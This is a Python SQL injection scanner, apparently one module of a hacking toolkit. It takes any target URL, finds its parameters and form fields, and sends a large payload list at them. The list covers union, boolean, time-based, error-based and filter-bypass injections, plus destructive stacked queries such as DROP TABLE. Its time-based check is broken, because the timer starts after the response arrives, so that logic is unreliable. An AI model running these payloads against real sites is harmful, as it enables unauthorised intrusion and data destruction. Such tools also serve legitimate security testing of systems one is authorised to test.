from Config.Util import *
from Config.Config import *
try:
    import requests
    import urllib.parse
    from bs4 import BeautifulSoup
    import threading
    import time
except Exception as e:
    ErrorModule(e)

Title("Advanced SQL Injection Scanner")

try:
    def test_sql_injection(url, param, payload, method='GET'):
        try:
            if method == 'GET':
                test_url = f"{url}?{param}={urllib.parse.quote(payload)}"
                response = requests.get(test_url, timeout=10)
            else:
                data = {param: payload}
                response = requests.post(url, data=data, timeout=10)
            
            # SQL error indicators
            sql_errors = [
                'SQL syntax', 'mysql_fetch', 'ORA-01756', 'Microsoft OLE DB',
                'SQLServer JDBC Driver', 'PostgreSQL query failed', 'Warning: mysql',
                'valid MySQL result', 'MySqlClient', 'com.mysql.jdbc.exceptions',
                'Zend_Db_Statement', 'Pdo_Mysql', 'Warning: mysqli', 'mysqli_fetch',
                'num_rows', 'OracleException', 'quoted string not properly terminated',
                'SQL command not properly ended', 'Unclosed quotation mark',
                'Microsoft Access Driver', 'JET Database Engine', 'Access Database Engine',
                'SQLSTATE', 'SQLException', 'SQLite/JDBCDriver', 'SQLite.Exception',
                'System.Data.SQLite.SQLiteException', 'Warning: sqlite', 'SQLITE_ERROR'
            ]
            
            # Time-based indicators
            start_time = time.time()
            response_time = time.time() - start_time
            
            # Check for SQL errors
            for error in sql_errors:
                if error.lower() in response.text.lower():
                    print(f"{BEFORE_GREEN + current_time_hour() + AFTER_GREEN} {GEN_VALID} SQL Error Found: {white}{error}{green}")
                    print(f"    URL: {white}{test_url if method == 'GET' else url}{green}")
                    print(f"    Payload: {white}{payload}{green}")
                    return True
            
            # Check for time-based injection (if payload contains SLEEP/WAITFOR)
            if ('sleep' in payload.lower() or 'waitfor' in payload.lower()) and response_time > 4:
                print(f"{BEFORE_GREEN + current_time_hour() + AFTER_GREEN} {GEN_VALID} Time-based SQLi: {white}Response time: {response_time:.2f}s{green}")
                print(f"    URL: {white}{test_url if method == 'GET' else url}{green}")
                print(f"    Payload: {white}{payload}{green}")
                return True
                
            return False
        except Exception as e:
            return False

    def scan_forms(url):
        try:
            response = requests.get(url, timeout=10)
            soup = BeautifulSoup(response.content, 'html.parser')
            forms = soup.find_all('form')
            
            vulnerable_forms = []
            
            for form in forms:
                action = form.get('action', '')
                method = form.get('method', 'GET').upper()
                
                if action:
                    form_url = urllib.parse.urljoin(url, action)
                else:
                    form_url = url
                
                inputs = form.find_all(['input', 'textarea', 'select'])
                
                for input_tag in inputs:
                    input_name = input_tag.get('name', '')
                    input_type = input_tag.get('type', 'text')
                    
                    if input_name and input_type not in ['submit', 'button', 'reset']:
                        vulnerable_forms.append({
                            'url': form_url,
                            'method': method,
                            'param': input_name,
                            'type': input_type
                        })
            
            return vulnerable_forms
        except:
            return []

    Slow(sql_banner)
    target_url = input(f"{BEFORE + current_time_hour() + AFTER} {INPUT} Target URL -> {reset}")
    Censored(target_url)
    
    if not target_url.startswith(('http://', 'https://')):
        target_url = 'https://' + target_url

    print(f"""
 {BEFORE}01{AFTER}{white} Scan URL parameters
 {BEFORE}02{AFTER}{white} Scan forms
 {BEFORE}03{AFTER}{white} Custom parameter test
    """)
    
    scan_type = input(f"{BEFORE + current_time_hour() + AFTER} {INPUT} Scan type -> {reset}")
    
    # Advanced SQL injection payloads
    sql_payloads = [
        # Basic injections
        "'", "\"", "' OR '1'='1", "' OR '1'='1' --", "' OR '1'='1' /*",
        "' OR 1=1 --", "' OR 1=1 /*", "admin'--", "admin' /*",
        
        # Union-based
        "' UNION SELECT NULL--", "' UNION SELECT NULL,NULL--", "' UNION SELECT NULL,NULL,NULL--",
        "' UNION SELECT user(),database(),version()--", "' UNION SELECT @@version--",
        
        # Boolean-based
        "' AND 1=1--", "' AND 1=2--", "' AND (SELECT COUNT(*) FROM information_schema.tables)>0--",
        
        # Time-based
        "'; WAITFOR DELAY '00:00:05'--", "' OR SLEEP(5)--", "' OR pg_sleep(5)--",
        "'; SELECT SLEEP(5)--", "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
        
        # Error-based
        "' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version()), 0x7e))--",
        "' AND (SELECT * FROM(SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
        
        # Stacked queries
        "'; DROP TABLE test--", "'; INSERT INTO test VALUES(1)--",
        
        # Bypass filters
        "' /**/OR/**/ '1'='1", "' %6fR '1'='1", "' OR 1=1#", "' OR 1=1/*",
        "' OR 'x'='x", "' OR 'a'='a", "' OR \"1\"=\"1", "' OR `1`=`1",
    ]
    
    vulnerabilities_found = 0
    
    if scan_type in ['1', '01']:
        # Scan URL parameters
        parsed_url = urllib.parse.urlparse(target_url)
        if parsed_url.query:
            params = urllib.parse.parse_qs(parsed_url.query)
            base_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}"
            
            print(f"{BEFORE + current_time_hour() + AFTER} {WAIT} Testing URL parameters...")
            
            for param in params.keys():
                print(f"{BEFORE + current_time_hour() + AFTER} {WAIT} Testing parameter: {white}{param}")
                for payload in sql_payloads:
                    if test_sql_injection(base_url, param, payload):
                        vulnerabilities_found += 1
        else:
            print(f"{BEFORE + current_time_hour() + AFTER} {ERROR} No parameters found in URL")
    
    elif scan_type in ['2', '02']:
        # Scan forms
        print(f"{BEFORE + current_time_hour() + AFTER} {WAIT} Scanning forms...")
        forms = scan_forms(target_url)
        
        if forms:
            print(f"{BEFORE + current_time_hour() + AFTER} {INFO} Found {white}{len(forms)}{red} form inputs")
            
            for form in forms:
                print(f"{BEFORE + current_time_hour() + AFTER} {WAIT} Testing form parameter: {white}{form['param']}")
                for payload in sql_payloads:
                    if test_sql_injection(form['url'], form['param'], payload, form['method']):
                        vulnerabilities_found += 1
        else:
            print(f"{BEFORE + current_time_hour() + AFTER} {ERROR} No forms found")
    
    elif scan_type in ['3', '03']:
        # Custom parameter test
        param = input(f"{BEFORE + current_time_hour() + AFTER} {INPUT} Parameter name -> {reset}")
        method = input(f"{BEFORE + current_time_hour() + AFTER} {INPUT} Method (GET/POST) -> {reset}").upper()
        
        if method not in ['GET', 'POST']:
            method = 'GET'
        
        print(f"{BEFORE + current_time_hour() + AFTER} {WAIT} Testing custom parameter: {white}{param}")
        for payload in sql_payloads:
            if test_sql_injection(target_url, param, payload, method):
                vulnerabilities_found += 1
    else:
        ErrorChoice()

    print(f"\n{BEFORE + current_time_hour() + AFTER} {INFO} Scan completed. Found {white}{vulnerabilities_found}{red} potential SQL injection vulnerabilities")
    
    if vulnerabilities_found > 0:
        print(f"{BEFORE + current_time_hour() + AFTER} {INFO} Recommendations:")
        print(f"  - Use parameterized queries/prepared statements")
        print(f"  - Implement input validation and sanitization")
        print(f"  - Use stored procedures where possible")
        print(f"  - Apply principle of least privilege to database accounts")

    Continue()
    Reset()
except Exception as e:
    Error(e)